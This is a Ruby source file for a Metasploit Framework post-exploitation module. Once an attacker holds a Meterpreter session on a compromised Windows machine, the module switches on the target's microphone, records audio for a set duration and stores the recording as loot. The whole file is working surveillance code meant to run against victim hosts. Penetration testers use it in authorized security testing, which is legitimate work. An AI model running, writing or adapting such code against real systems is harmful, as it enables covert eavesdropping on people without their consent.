##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Multi Manage Record Microphone',
			'Description'   => %q{
				This module will enable and record your target's microphone.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'sinn3r'],
			'Platform'      => [ 'win'],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptInt.new('DURATION', [false, 'Number of seconds to record', 5])
			], self.class)
	end

	def rhost
		client.sock.peerhost
	end

	def progress
		timeout = (datastore['DURATION'] < 1) ? 1 : (datastore['DURATION']*0.1)
		datastore['DURATION'].times do |i|
			print_status("Recording: #{(Float(i+1)/datastore['DURATION'] * 100).round}% done...")
			select(nil, nil, nil, timeout)
		end
	end

	def run
		if client.nil?
			print_error("Invalid session ID selected. Make sure the host isn't dead.")
			return
		end

		data = nil

		begin
			t = framework.threads.spawn("prog", false) { progress }
			data = client.webcam.record_mic(datastore['DURATION'])
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error(e.message)
			return
		ensure
			t.kill
		end

		if data
			print_status("#{rhost} - Audio size: (#{data.length.to_s} bytes)")
			p = store_loot(
				"#{rhost}.audio",
				'application/octet-stream',
				rhost,
				data,
				"#{rhost}_audio.wav",
				"#{rhost} Audio Recording"
			)

			print_good("#{rhost} - Audio recording saved: #{p}")
		end
	end

end